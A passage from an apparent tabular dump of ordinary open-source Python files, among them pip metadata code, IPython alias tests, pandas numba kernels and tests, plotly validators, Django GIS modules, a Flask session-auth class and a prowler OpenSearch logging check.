    args = make_setuptools_egg_info_args(
        setup_py_path,
        egg_info_dir=egg_info_dir,
        no_user_config=isolated,
    )

    with build_env:
        call_subprocess(
            args,
            cwd=source_dir,
            command_desc='python setup.py egg_info',
        )

    # Return the .egg-info directory.
    return _find_egg_info(egg_info_dir)"
JY211	JY211-test_alias.py	"from IPython.utils.capture import capture_output

import pytest

def test_alias_lifecycle():
    name = 'test_alias1'
    cmd = 'echo ""Hello""'
    am = _ip.alias_manager
    am.clear_aliases()
    am.define_alias(name, cmd)
    assert am.is_alias(name)
    assert am.retrieve_alias(name) == cmd
    assert (name, cmd) in am.aliases
    
    # Test running the alias
    orig_system = _ip.system
    result = []
    _ip.system = result.append
    try:
        _ip.run_cell('%{}'.format(name))
        result = [c.strip() for c in result]
        assert result == [cmd]
    finally:
        _ip.system = orig_system
    
    # Test removing the alias
    am.undefine_alias(name)
    assert not am.is_alias(name)
    with pytest.raises(ValueError):
        am.retrieve_alias(name)
    assert (name, cmd) not in am.aliases
    

def test_alias_args_error():
    """"""Error expanding with wrong number of arguments""""""
    _ip.alias_manager.define_alias('parts', 'echo first %s second %s')
    # capture stderr:
    with capture_output() as cap:
        _ip.run_cell('parts 1')

    assert cap.stderr.split("":"")[0] == ""UsageError""


def test_alias_args_commented():
    """"""Check that alias correctly ignores 'commented out' args""""""
    _ip.run_line_magic(""alias"", ""commentarg echo this is %%s a commented out arg"")

    with capture_output() as cap:
        _ip.run_cell(""commentarg"")

    # strip() is for pytest compat; testing via iptest patch IPython shell
    # in testing.globalipapp and replace the system call which messed up the
    # \r\n
    assert cap.stdout.strip() ==  'this is %s a commented out arg'

def test_alias_args_commented_nargs():
    """"""Check that alias correctly counts args, excluding those commented out""""""
    am = _ip.alias_manager
    alias_name = 'comargcount'
    cmd = 'echo this is %%s a commented out arg and this is not %s'
    
    am.define_alias(alias_name, cmd)
    assert am.is_alias(alias_name)
    
    thealias = am.get_alias(alias_name)
    assert thealias.nargs == 1"
JY474	JY474-min_max_.py	"""""""
Numba 1D min/max kernels that can be shared by
* Dataframe / Series
* groupby
* rolling / expanding

Mirrors pandas/_libs/window/aggregation.pyx
""""""
from __future__ import annotations

import numba
import numpy as np


@numba.jit(nopython=True, nogil=True, parallel=False)
def sliding_min_max(
    values: np.ndarray,
    start: np.ndarray,
    end: np.ndarray,
    min_periods: int,
    is_max: bool,
) -> np.ndarray:
    N = len(start)
    nobs = 0
    output = np.empty(N, dtype=np.float64)
    # Use deque once numba supports it
    # https://github.com/numba/numba/issues/7417
    Q: list = []
    W: list = []
    for i in range(N):

        curr_win_size = end[i] - start[i]
        if i == 0:
            st = start[i]
        else:
            st = end[i - 1]

        for k in range(st, end[i]):
            ai = values[k]
            if not np.isnan(ai):
                nobs += 1
            elif is_max:
                ai = -np.inf
            else:
                ai = np.inf
            # Discard previous entries if we find new min or max
            if is_max:
                while Q and ((ai >= values[Q[-1]]) or values[Q[-1]] != values[Q[-1]]):
                    Q.pop()
            else:
                while Q and ((ai <= values[Q[-1]]) or values[Q[-1]] != values[Q[-1]]):
                    Q.pop()
            Q.append(k)
            W.append(k)

        # Discard entries outside and left of current window
        while Q and Q[0] <= start[i] - 1:
            Q.pop(0)
        while W and W[0] <= start[i] - 1:
            if not np.isnan(values[W[0]]):
                nobs -= 1
            W.pop(0)

        # Save output based on index in input value array
        if Q and curr_win_size > 0 and nobs >= min_periods:
            output[i] = values[Q[0]]
        else:
            output[i] = np.nan

    return output"
JD518	JD518-test_freq_attr.py	"import pytest

from pandas import TimedeltaIndex

from pandas.tseries.offsets import (
    DateOffset,
    Day,
    Hour,
)


class TestFreq:
    @pytest.mark.parametrize(""values"", [[""0 days"", ""2 days"", ""4 days""], []])
    @pytest.mark.parametrize(""freq"", [""2D"", Day(2), ""48H"", Hour(48)])
    def test_freq_setter(self, values, freq):
        # GH#20678
        idx = TimedeltaIndex(values)

        # can set to an offset, converting from string if necessary
        idx._data.freq = freq
        assert idx.freq == freq
        assert isinstance(idx.freq, DateOffset)

        # can reset to None
        idx._data.freq = None
        assert idx.freq is None

    def test_freq_setter_errors(self):
        # GH#20678
        idx = TimedeltaIndex([""0 days"", ""2 days"", ""4 days""])

        # setting with an incompatible freq
        msg = (
            ""Inferred frequency 2D from passed values does not conform to ""
            ""passed frequency 5D""
        )
        with pytest.raises(ValueError, match=msg):
            idx._data.freq = ""5D""

        # setting with a non-fixed frequency
        msg = r""<2 \* BusinessDays> is a non-fixed frequency""
        with pytest.raises(ValueError, match=msg):
            idx._data.freq = ""2B""

        # setting with non-freq string
        with pytest.raises(ValueError, match=""Invalid frequency""):
            idx._data.freq = ""foo""

    def test_freq_view_safe(self):
        # Setting the freq for one TimedeltaIndex shouldn't alter the freq
        #  for another that views the same data

        tdi = TimedeltaIndex([""0 days"", ""2 days"", ""4 days""], freq=""2D"")
        tda = tdi._data

        tdi2 = TimedeltaIndex(tda)._with_freq(None)
        assert tdi2.freq is None

        # Original was not altered
        assert tdi.freq == ""2D""
        assert tda.freq == ""2D"""
JD355	JD355-views.py	"""""""
views.py        # Houses `SchemaView`, `APIView` subclass.

See schemas.__init__.py for package overview.
""""""
from rest_framework import exceptions, renderers
from rest_framework.response import Response
from rest_framework.schemas import coreapi
from rest_framework.settings import api_settings
from rest_framework.views import APIView


class SchemaView(APIView):
    _ignore_model_permissions = True
    schema = None  # exclude from schema
    renderer_classes = None
    schema_generator = None
    public = False

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        if self.renderer_classes is None:
            if coreapi.is_enabled():
                self.renderer_classes = [
                    renderers.CoreAPIOpenAPIRenderer,
                    renderers.CoreJSONRenderer
                ]
            else:
                self.renderer_classes = [
                    renderers.OpenAPIRenderer,
                    renderers.JSONOpenAPIRenderer,
                ]
            if renderers.BrowsableAPIRenderer in api_settings.DEFAULT_RENDERER_CLASSES:
                self.renderer_classes += [renderers.BrowsableAPIRenderer]

    def get(self, request, *args, **kwargs):
        schema = self.schema_generator.get_schema(request, self.public)
        if schema is None:
            raise exceptions.PermissionDenied()
        return Response(schema)

    def handle_exception(self, exc):
        # Schema renderers do not render exceptions, so re-perform content
        # negotiation with default renderers.
        self.renderer_classes = api_settings.DEFAULT_RENDERER_CLASSES
        neg = self.perform_content_negotiation(self.request, force=True)
        self.request.accepted_renderer, self.request.accepted_media_type = neg
        return super().handle_exception(exc)"
JD387	JD387-_outsidetextfont.py	"import _plotly_utils.basevalidators


class OutsidetextfontValidator(_plotly_utils.basevalidators.CompoundValidator):
    def __init__(self, plotly_name=""outsidetextfont"", parent_name=""funnel"", **kwargs):
        super(OutsidetextfontValidator, self).__init__(
            plotly_name=plotly_name,
            parent_name=parent_name,
            data_class_str=kwargs.pop(""data_class_str"", ""Outsidetextfont""),
            data_docs=kwargs.pop(
                ""data_docs"",
                """"""
            color

            colorsrc
                Sets the source reference on Chart Studio Cloud
                for `color`.
            family
                HTML font family - the typeface that will be
                applied by the web browser. The web browser
                will only be able to apply a font if it is
                available on the system which it operates.
                Provide multiple font families, separated by
                commas, to indicate the preference in which to
                apply fonts if they aren't available on the
                system. The Chart Studio Cloud (at
                https://chart-studio.plotly.com or on-premise)
                generates images on a server, where only a
                select number of fonts are installed and
                supported. These include ""Arial"", ""Balto"",
                ""Courier New"", ""Droid Sans"",, ""Droid Serif"",
                ""Droid Sans Mono"", ""Gravitas One"", ""Old
                Standard TT"", ""Open Sans"", ""Overpass"", ""PT Sans
                Narrow"", ""Raleway"", ""Times New Roman"".
            familysrc
                Sets the source reference on Chart Studio Cloud
                for `family`.
            size

            sizesrc
                Sets the source reference on Chart Studio Cloud
                for `size`.
"""""",
            ),
            **kwargs,
        )"
JD157	JD157-release_utils.py	"import argparse
from typing import Tuple


def get_next_version(release_type) -> Tuple[Tuple[int, int, int], str, str]:
    current_ver = find_version(""fairseq/version.txt"")
    version_list = [int(x) for x in current_ver.strip(""'"").split(""."")]
    major, minor, patch = version_list[0], version_list[1], version_list[2]
    if release_type == ""patch"":
        patch += 1
    elif release_type == ""minor"":
        minor += 1
        patch = 0
    elif release_type == ""major"":
        major += 1
        minor = patch = 0
    else:
        raise ValueError(
            ""Incorrect release type specified. Acceptable types are major, minor and patch.""
        )

    new_version_tuple = (major, minor, patch)
    new_version_str = ""."".join([str(x) for x in new_version_tuple])
    new_tag_str = ""v"" + new_version_str
    return new_version_tuple, new_version_str, new_tag_str


def find_version(version_file_path) -> str:
    with open(version_file_path) as f:
        version = f.read().strip()
        return version


def update_version(new_version_str) -> None:
    """"""
    given the current version, update the version to the
    next version depending on the type of release.
    """"""

    with open(""fairseq/version.txt"", ""w"") as writer:
        writer.write(new_version_str)


def main(args):
    if args.release_type in [""major"", ""minor"", ""patch""]:
        new_version_tuple, new_version, new_tag = get_next_version(args.release_type)
    else:
        raise ValueError(""Incorrect release type specified"")

    if args.update_version:
        update_version(new_version)

    print(new_version, new_tag)


if __name__ == ""__main__"":
    parser = argparse.ArgumentParser(description=""Versioning utils"")
    parser.add_argument(
        ""--release-type"",
        type=str,
        required=True,
        help=""type of release = major/minor/patch"",
    )
    parser.add_argument(
        ""--update-version"",
        action=""store_true"",
        required=False,
        help=""updates the version in fairseq/version.txt"",
    )

    args = parser.parse_args()
    main(args)"
JY265	JY265-_compat.py	"import sys
import platform


__all__ = ['install', 'NullFinder', 'Protocol']


try:
    from typing import Protocol
except ImportError:  # pragma: no cover
    # Python 3.7 compatibility
    from ..typing_extensions import Protocol  # type: ignore


def install(cls):
    """"""
    Class decorator for installation on sys.meta_path.

    Adds the backport DistributionFinder to sys.meta_path and
    attempts to disable the finder functionality of the stdlib
    DistributionFinder.
    """"""
    sys.meta_path.append(cls())
    disable_stdlib_finder()
    return cls


def disable_stdlib_finder():
    """"""
    Give the backport primacy for discovering path-based distributions
    by monkey-patching the stdlib O_O.

    See #91 for more background for rationale on this sketchy
    behavior.
    """"""

    def matches(finder):
        return getattr(
            finder, '__module__', None
        ) == '_frozen_importlib_external' and hasattr(finder, 'find_distributions')

    for finder in filter(matches, sys.meta_path):  # pragma: nocover
        del finder.find_distributions


class NullFinder:
    """"""
    A ""Finder"" (aka ""MetaClassFinder"") that never finds any modules,
    but may find distributions.
    """"""

    @staticmethod
    def find_spec(*args, **kwargs):
        return None

    # In Python 2, the import system requires finders
    # to have a find_module() method, but this usage
    # is deprecated in Python 3 in favor of find_spec().
    # For the purposes of this finder (i.e. being present
    # on sys.meta_path but having no other import
    # system functionality), the two methods are identical.
    find_module = find_spec


def pypy_partial(val):
    """"""
    Adjust for variable stacklevel on partial under PyPy.

    Workaround for #327.
    """"""
    is_pypy = platform.python_implementation() == 'PyPy'
    return val + is_pypy"
JD481	JD481-rotate.py	"from distutils.util import convert_path
from distutils import log
from distutils.errors import DistutilsOptionError
import os
import shutil

from setuptools.extern import six

from setuptools import Command


class rotate(Command):
    """"""Delete older distributions""""""

    description = ""delete older distributions, keeping N newest files""
    user_options = [
        ('match=', 'm', ""patterns to match (required)""),
        ('dist-dir=', 'd', ""directory where the distributions are""),
        ('keep=', 'k', ""number of matching distributions to keep""),
    ]

    boolean_options = []

    def initialize_options(self):
        self.match = None
        self.dist_dir = None
        self.keep = None

    def finalize_options(self):
        if self.match is None:
            raise DistutilsOptionError(
                ""Must specify one or more (comma-separated) match patterns ""
                ""(e.g. '.zip' or '.egg')""
            )
        if self.keep is None:
            raise DistutilsOptionError(""Must specify number of files to keep"")
        try:
            self.keep = int(self.keep)
        except ValueError:
            raise DistutilsOptionError(""--keep must be an integer"")
        if isinstance(self.match, six.string_types):
            self.match = [
                convert_path(p.strip()) for p in self.match.split(',')
            ]
        self.set_undefined_options('bdist', ('dist_dir', 'dist_dir'))

    def run(self):
        self.run_command(""egg_info"")
        from glob import glob

        for pattern in self.match:
            pattern = self.distribution.get_name() + '*' + pattern
            files = glob(os.path.join(self.dist_dir, pattern))
            files = [(os.path.getmtime(f), f) for f in files]
            files.sort()
            files.reverse()

            log.info(""%d file(s) matching %s"", len(files), pattern)
            files = files[self.keep:]
            for (t, f) in files:
                log.info(""Deleting %s"", f)
                if not self.dry_run:
                    if os.path.isdir(f):
                        shutil.rmtree(f)
                    else:
                        os.unlink(f)"
JD46	JD46-metadata_legacy.py	"""""""Metadata generation logic for legacy source distributions.
""""""

import logging
import os

from pip._internal.build_env import BuildEnvironment
from pip._internal.cli.spinners import open_spinner
from pip._internal.exceptions import (
    InstallationError,
    InstallationSubprocessError,
    MetadataGenerationFailed,
)
from pip._internal.utils.setuptools_build import make_setuptools_egg_info_args
from pip._internal.utils.subprocess import call_subprocess
from pip._internal.utils.temp_dir import TempDirectory

logger = logging.getLogger(__name__)


def _find_egg_info(directory: str) -> str:
    """"""Find an .egg-info subdirectory in `directory`.""""""
    filenames = [f for f in os.listdir(directory) if f.endswith("".egg-info"")]

    if not filenames:
        raise InstallationError(f""No .egg-info directory found in {directory}"")

    if len(filenames) > 1:
        raise InstallationError(
            ""More than one .egg-info directory found in {}"".format(directory)
        )

    return os.path.join(directory, filenames[0])


def generate_metadata(
    build_env: BuildEnvironment,
    setup_py_path: str,
    source_dir: str,
    isolated: bool,
    details: str,
) -> str:
    """"""Generate metadata using setup.py-based defacto mechanisms.

    Returns the generated metadata directory.
    """"""
    logger.debug(
        ""Running setup.py (path:%s) egg_info for package %s"",
        setup_py_path,
        details,
    )

    egg_info_dir = TempDirectory(kind=""pip-egg-info"", globally_managed=True).path

    args = make_setuptools_egg_info_args(
        setup_py_path,
        egg_info_dir=egg_info_dir,
        no_user_config=isolated,
    )

    with build_env:
        with open_spinner(""Preparing metadata (setup.py)"") as spinner:
            try:
                call_subprocess(
                    args,
                    cwd=source_dir,
                    command_desc=""python setup.py egg_info"",
                    spinner=spinner,
                )
            except InstallationSubprocessError as error:
                raise MetadataGenerationFailed(package_details=details) from error

    # Return the .egg-info directory.
    return _find_egg_info(egg_info_dir)"
JY296	JY296-_hoverlabel.py	"import _plotly_utils.basevalidators


class HoverlabelValidator(_plotly_utils.basevalidators.CompoundValidator):
    def __init__(self, plotly_name=""hoverlabel"", parent_name=""scatter3d"", **kwargs):
        super(HoverlabelValidator, self).__init__(
            plotly_name=plotly_name,
            parent_name=parent_name,
            data_class_str=kwargs.pop(""data_class_str"", ""Hoverlabel""),
            data_docs=kwargs.pop(
                ""data_docs"",
                """"""
            align
                Sets the horizontal alignment of the text
                content within hover label box. Has an effect
                only if the hover label text spans more two or
                more lines
            alignsrc
                Sets the source reference on Chart Studio Cloud
                for `align`.
            bgcolor
                Sets the background color of the hover labels
                for this trace
            bgcolorsrc
                Sets the source reference on Chart Studio Cloud
                for `bgcolor`.
            bordercolor
                Sets the border color of the hover labels for
                this trace.
            bordercolorsrc
                Sets the source reference on Chart Studio Cloud
                for `bordercolor`.
            font
                Sets the font used in hover labels.
            namelength
                Sets the default length (in number of
                characters) of the trace name in the hover
                labels for all traces. -1 shows the whole name
                regardless of length. 0-3 shows the first 0-3
                characters, and an integer >3 will show the
                whole name if it is less than that many
                characters, but if it is longer, will truncate
                to `namelength - 3` characters and add an
                ellipsis.
            namelengthsrc
                Sets the source reference on Chart Studio Cloud
                for `namelength`.
"""""",
            ),
            **kwargs,
        )"
JY86	JY86-__init__.py	"""""""
 This module houses ctypes interfaces for GDAL objects.  The following GDAL
 objects are supported:

 CoordTransform: Used for coordinate transformations from one spatial
  reference system to another.

 Driver: Wraps an OGR data source driver.

 DataSource: Wrapper for the OGR data source object, supports
  OGR-supported data sources.

 Envelope: A ctypes structure for bounding boxes (GDAL library
  not required).

 OGRGeometry: Object for accessing OGR Geometry functionality.

 OGRGeomType: A class for representing the different OGR Geometry
  types (GDAL library not required).

 SpatialReference: Represents OSR Spatial Reference objects.

 The GDAL library will be imported from the system path using the default
 library name for the current OS. The default library path may be overridden
 by setting `GDAL_LIBRARY_PATH` in your settings with the path to the GDAL C
 library on your system.
""""""
from django.contrib.gis.gdal.datasource import DataSource
from django.contrib.gis.gdal.driver import Driver
from django.contrib.gis.gdal.envelope import Envelope
from django.contrib.gis.gdal.error import (
    GDALException, SRSException, check_err,
)
from django.contrib.gis.gdal.geometries import OGRGeometry
from django.contrib.gis.gdal.geomtype import OGRGeomType
from django.contrib.gis.gdal.libgdal import (
    GDAL_VERSION, gdal_full_version, gdal_version,
)
from django.contrib.gis.gdal.raster.source import GDALRaster
from django.contrib.gis.gdal.srs import (
    AxisOrder, CoordTransform, SpatialReference,
)

__all__ = (
    'AxisOrder', 'Driver', 'DataSource', 'CoordTransform', 'Envelope',
    'GDALException', 'GDALRaster', 'GDAL_VERSION', 'OGRGeometry',
    'OGRGeomType', 'SpatialReference', 'SRSException', 'check_err',
    'gdal_version', 'gdal_full_version',
)"
JD184	JD184-session_db_auth.py	"#!/usr/bin/env python3
""""""Session authentication with expiration
and storage support module for the API.
""""""
from flask import request
from datetime import datetime, timedelta

from models.user_session import UserSession
from .session_exp_auth import SessionExpAuth


class SessionDBAuth(SessionExpAuth):
    """"""Session authentication class with expiration and storage support.
    """"""

    def create_session(self, user_id=None) -> str:
        """"""Creates and stores a session id for the user.
        """"""
        session_id = super().create_session(user_id)
        if type(session_id) == str:
            kwargs = {
                'user_id': user_id,
                'session_id': session_id,
            }
            user_session = UserSession(**kwargs)
            user_session.save()
            return session_id

    def user_id_for_session_id(self, session_id=None):
        """"""Retrieves the user id of the user associated with
        a given session id.
        """"""
        try:
            sessions = UserSession.search({'session_id': session_id})
        except Exception:
            return None
        if len(sessions) <= 0:
            return None
        cur_time = datetime.now()
        time_span = timedelta(seconds=self.session_duration)
        exp_time = sessions[0].created_at + time_span
        if exp_time < cur_time:
            return None
        return sessions[0].user_id

    def destroy_session(self, request=None) -> bool:
        """"""Destroys an authenticated session.
        """"""
        session_id = self.session_cookie(request)
        try:
            sessions = UserSession.search({'session_id': session_id})
        except Exception:
            return False
        if len(sessions) <= 0:
            return False
        sessions[0].remove()
        return True"
JD456	JD456-batch_predict.py	"# Copyright 2020 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#    http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.


def batch_predict(project_id, model_id, input_uri, output_uri):
    """"""Batch predict""""""
    # [START automl_batch_predict]
    from google.cloud import automl

    # TODO(developer): Uncomment and set the following variables
    # project_id = ""YOUR_PROJECT_ID""
    # model_id = ""YOUR_MODEL_ID""
    # input_uri = ""gs://YOUR_BUCKET_ID/path/to/your/input/csv_or_jsonl""
    # output_uri = ""gs://YOUR_BUCKET_ID/path/to/save/results/""

    prediction_client = automl.PredictionServiceClient()

    # Get the full path of the model.
    model_full_id = f""projects/{project_id}/locations/us-central1/models/{model_id}""

    gcs_source = automl.GcsSource(input_uris=[input_uri])

    input_config = automl.BatchPredictInputConfig(gcs_source=gcs_source)
    gcs_destination = automl.GcsDestination(output_uri_prefix=output_uri)
    output_config = automl.BatchPredictOutputConfig(gcs_destination=gcs_destination)

    response = prediction_client.batch_predict(
        name=model_full_id, input_config=input_config, output_config=output_config
    )

    print(""Waiting for operation to complete..."")
    print(
        f""Batch Prediction results saved to Cloud Storage bucket. {response.result()}""
    )
    # [END automl_batch_predict]"
JD274	JD274-models.py	"""""""
 The GeometryColumns and SpatialRefSys models for the SpatiaLite backend.
""""""
from django.contrib.gis.db.backends.base.models import SpatialRefSysMixin
from django.db import models


class SpatialiteGeometryColumns(models.Model):
    """"""
    The 'geometry_columns' table from SpatiaLite.
    """"""

    f_table_name = models.CharField(max_length=256)
    f_geometry_column = models.CharField(max_length=256)
    coord_dimension = models.IntegerField()
    srid = models.IntegerField(primary_key=True)
    spatial_index_enabled = models.IntegerField()
    type = models.IntegerField(db_column=""geometry_type"")

    class Meta:
        app_label = ""gis""
        db_table = ""geometry_columns""
        managed = False

    def __str__(self):
        return ""%s.%s - %dD %s field (SRID: %d)"" % (
            self.f_table_name,
            self.f_geometry_column,
            self.coord_dimension,
            self.type,
            self.srid,
        )

    @classmethod
    def table_name_col(cls):
        """"""
        Return the name of the metadata column used to store the feature table
        name.
        """"""
        return ""f_table_name""

    @classmethod
    def geom_col_name(cls):
        """"""
        Return the name of the metadata column used to store the feature
        geometry column.
        """"""
        return ""f_geometry_column""


class SpatialiteSpatialRefSys(models.Model, SpatialRefSysMixin):
    """"""
    The 'spatial_ref_sys' table from SpatiaLite.
    """"""

    srid = models.IntegerField(primary_key=True)
    auth_name = models.CharField(max_length=256)
    auth_srid = models.IntegerField()
    ref_sys_name = models.CharField(max_length=256)
    proj4text = models.CharField(max_length=2048)
    srtext = models.CharField(max_length=2048)

    class Meta:
        app_label = ""gis""
        db_table = ""spatial_ref_sys""
        managed = False

    @property
    def wkt(self):
        return self.srtext"
JD138	JD138-_textfont.py	"import _plotly_utils.basevalidators


class TextfontValidator(_plotly_utils.basevalidators.CompoundValidator):
    def __init__(self, plotly_name=""textfont"", parent_name=""scattersmith"", **kwargs):
        super(TextfontValidator, self).__init__(
            plotly_name=plotly_name,
            parent_name=parent_name,
            data_class_str=kwargs.pop(""data_class_str"", ""Textfont""),
            data_docs=kwargs.pop(
                ""data_docs"",
                """"""
            color

            colorsrc
                Sets the source reference on Chart Studio Cloud
                for `color`.
            family
                HTML font family - the typeface that will be
                applied by the web browser. The web browser
                will only be able to apply a font if it is
                available on the system which it operates.
                Provide multiple font families, separated by
                commas, to indicate the preference in which to
                apply fonts if they aren't available on the
                system. The Chart Studio Cloud (at
                https://chart-studio.plotly.com or on-premise)
                generates images on a server, where only a
                select number of fonts are installed and
                supported. These include ""Arial"", ""Balto"",
                ""Courier New"", ""Droid Sans"",, ""Droid Serif"",
                ""Droid Sans Mono"", ""Gravitas One"", ""Old
                Standard TT"", ""Open Sans"", ""Overpass"", ""PT Sans
                Narrow"", ""Raleway"", ""Times New Roman"".
            familysrc
                Sets the source reference on Chart Studio Cloud
                for `family`.
            size

            sizesrc
                Sets the source reference on Chart Studio Cloud
                for `size`.
"""""",
            ),
            **kwargs,
        )"
JD337	JD337-reddit.py	"""""""
Reddit OAuth2 backend, docs at:
    https://python-social-auth.readthedocs.io/en/latest/backends/reddit.html
""""""
import base64

from .oauth import BaseOAuth2


class RedditOAuth2(BaseOAuth2):
    """"""Reddit OAuth2 authentication backend""""""
    name = 'reddit'
    AUTHORIZATION_URL = 'https://ssl.reddit.com/api/v1/authorize'
    ACCESS_TOKEN_URL = 'https://ssl.reddit.com/api/v1/access_token'
    ACCESS_TOKEN_METHOD = 'POST'
    REFRESH_TOKEN_METHOD = 'POST'
    REDIRECT_STATE = False
    SCOPE_SEPARATOR = ','
    DEFAULT_SCOPE = ['identity']
    SEND_USER_AGENT = True
    EXTRA_DATA = [
        ('id', 'id'),
        ('name', 'username'),
        ('link_karma', 'link_karma'),
        ('comment_karma', 'comment_karma'),
        ('refresh_token', 'refresh_token'),
        ('expires_in', 'expires')
    ]

    def get_user_details(self, response):
        """"""Return user details from Reddit account""""""
        return {'username': response.get('name'),
                'email': '', 'fullname': '',
                'first_name': '', 'last_name': ''}

    def user_data(self, access_token, *args, **kwargs):
        """"""Loads user data from service""""""
        return self.get_json(
            'https://oauth.reddit.com/api/v1/me.json',
            headers={'Authorization': 'bearer ' + access_token}
        )

    def auth_headers(self):
        return {
            'Authorization': b'Basic ' + base64.urlsafe_b64encode(
                '{}:{}'.format(*self.get_key_and_secret()).encode()
            )
        }

    def refresh_token_params(self, token, redirect_uri=None, *args, **kwargs):
        params = super().refresh_token_params(token)
        params['redirect_uri'] = self.redirect_uri or redirect_uri
        return params

    def auth_complete_credentials(self):
        return self.get_key_and_secret()"
JY205	JY205-payload.py	"# -*- coding: utf-8 -*-
""""""Payload system for IPython.

Authors:

* Fernando Perez
* Brian Granger
""""""

#-----------------------------------------------------------------------------
#       Copyright (C) 2008-2011 The IPython Development Team
#
#  Distributed under the terms of the BSD License.  The full license is in
#  the file COPYING, distributed as part of this software.
#-----------------------------------------------------------------------------

#-----------------------------------------------------------------------------
# Imports
#-----------------------------------------------------------------------------

from traitlets.config.configurable import Configurable
from traitlets import List

#-----------------------------------------------------------------------------
# Main payload class
#-----------------------------------------------------------------------------

class PayloadManager(Configurable):

    _payload = List([])

    def write_payload(self, data, single=True):
        """"""Include or update the specified `data` payload in the PayloadManager.

        If a previous payload with the same source exists and `single` is True,
        it will be overwritten with the new one.
        """"""

        if not isinstance(data, dict):
            raise TypeError('Each payload write must be a dict, got: %r' % data)

        if single and 'source' in data:
            source = data['source']
            for i, pl in enumerate(self._payload):
                if 'source' in pl and pl['source'] == source:
                    self._payload[i] = data
                    return

        self._payload.append(data)

    def read_payload(self):
        return self._payload

    def clear_payload(self):
        self._payload = []"
JD349	JD349-opensearch_service_domains_cloudwatch_logging_enabled.py	"from prowler.lib.check.models import Check, Check_Report_AWS
from prowler.providers.aws.services.opensearch.opensearch_client import (
    opensearch_client,
)


class opensearch_service_domains_cloudwatch_logging_enabled(Check):
    def execute(self):
        findings = []
        for domain in opensearch_client.opensearch_domains:
            report = Check_Report_AWS(self.metadata())
            report.region = domain.region
            report.resource_id = domain.name
            report.resource_arn = domain.arn
            report.status = ""FAIL""
            report.status_extended = f""Opensearch domain {domain.name} SEARCH_SLOW_LOGS and INDEX_SLOW_LOGS disabled""
            has_SEARCH_SLOW_LOGS = False
            has_INDEX_SLOW_LOGS = False
            for logging_item in domain.logging:
                if logging_item.name == ""SEARCH_SLOW_LOGS"" and logging_item.enabled:
                    has_SEARCH_SLOW_LOGS = True
                if logging_item.name == ""INDEX_SLOW_LOGS"" and logging_item.enabled:
                    has_INDEX_SLOW_LOGS = True

            if has_SEARCH_SLOW_LOGS and has_INDEX_SLOW_LOGS:
                report.status = ""PASS""
                report.status_extended = f""Opensearch domain {domain.name} SEARCH_SLOW_LOGS and INDEX_SLOW_LOGS enabled""
            elif not has_SEARCH_SLOW_LOGS and has_INDEX_SLOW_LOGS:
                report.status = ""FAIL""
                report.status_extended = f""Opensearch domain {domain.name} INDEX_SLOW_LOGS enabled but SEARCH_SLOW_LOGS disabled""
            elif not has_INDEX_SLOW_LOGS and has_SEARCH_SLOW_LOGS:
                report.status = ""FAIL""
                report.status_extended = f""Opensearch domain {domain.name} SEARCH_SLOW_LOGS enabled but INDEX_SLOW_LOGS disabled""

            findings.append(report)

        return findings"
JY56	JY56-intranges.py	"""""""
Given a list of integers, made up of (hopefully) a small number of long runs
of consecutive integers, compute a representation of the form
((start1, end1), (start2, end2) ...). Then answer the question ""was x present
in the original list?"" in time O(log(# runs)).
""""""

import bisect
from typing import List, Tuple

def intranges_from_list(list_: List[int]) -> Tuple[int, ...]:
    """"""Represent a list of integers as a sequence of ranges:
    ((start_0, end_0), (start_1, end_1), ...), such that the original
    integers are exactly those x such that start_i <= x < end_i for some i.

    Ranges are encoded as single integers (start << 32 | end), not as tuples.
    """"""

    sorted_list = sorted(list_)
    ranges = []
    last_write = -1
    for i in range(len(sorted_list)):
        if i+1 < len(sorted_list):
            if sorted_list[i] == sorted_list[i+1]-1:
                continue
        current_range = sorted_list[last_write+1:i+1]
        ranges.append(_encode_range(current_range[0], current_range[-1] + 1))
        last_write = i

    return tuple(ranges)

def _encode_range(start: int, end: int) -> int:
    return (start << 32) | end

def _decode_range(r: int) -> Tuple[int, int]:
    return (r >> 32), (r & ((1 << 32) - 1))


def intranges_contain(int_: int, ranges: Tuple[int, ...]) -> bool:
    """"""Determine if `int_` falls into one of the ranges in `ranges`.""""""
    tuple_ = _encode_range(int_, 0)
    pos = bisect.bisect_left(ranges, tuple_)
    # we could be immediately ahead of a tuple (start, end)
    # with start < int_ <= end
    if pos > 0:
        left, right = _decode_range(ranges[pos-1])
        if left <= int_ < right:
            return True
    # or we could be immediately behind a tuple (int_, end)
    if pos < len(ranges):
        left, _ = _decode_range(ranges[pos])
        if left == int_:
            return True
    return False"
JD22	JD22-arm.py	"import sys                                                                     
                                                                               
from numpy.distutils.fcompiler import FCompiler, dummy_fortran_file
from sys import platform                                                       
from os.path import join, dirname, normpath

compilers = ['ArmFlangCompiler']

import functools

class ArmFlangCompiler(FCompiler):
    compiler_type = 'arm'
    description = 'Arm Compiler'
    version_pattern = r'\s*Arm.*version (?P<version>[\d.-]+).*'

    ar_exe = 'lib.exe'
    possible_executables = ['armflang']

    executables = {
        'version_cmd': ["""", ""--version""],
        'compiler_f77': [""armflang"", ""-fPIC""],
        'compiler_fix': [""armflang"", ""-fPIC"", ""-ffixed-form""],
        'compiler_f90': [""armflang"", ""-fPIC""],
        'linker_so': [""armflang"", ""-fPIC"", ""-shared""],
        'archiver': [""ar"", ""-cr""],
        'ranlib':  None
    }

    pic_flags = [""-fPIC"", ""-DPIC""]
    c_compiler = 'arm'
    module_dir_switch = '-module '  # Don't remove ending space!

    def get_libraries(self):
        opt = FCompiler.get_libraries(self)
        opt.extend(['flang', 'flangrti', 'ompstub'])
        return opt

    @functools.lru_cache(maxsize=128)
    def get_library_dirs(self):
        """"""List of compiler library directories.""""""
        opt = FCompiler.get_library_dirs(self)
        flang_dir = dirname(self.executables['compiler_f77'][0])
        opt.append(normpath(join(flang_dir, '..', 'lib')))

        return opt

    def get_flags(self):
        return []

    def get_flags_free(self):
        return []

    def get_flags_debug(self):
        return ['-g']

    def get_flags_opt(self):
        return ['-O3']

    def get_flags_arch(self):
        return []

    def runtime_library_dir_option(self, dir):
        return '-Wl,-rpath=%s' % dir


if __name__ == '__main__':
    from distutils import log
    log.set_verbosity(2)
    from numpy.distutils import customized_fcompiler
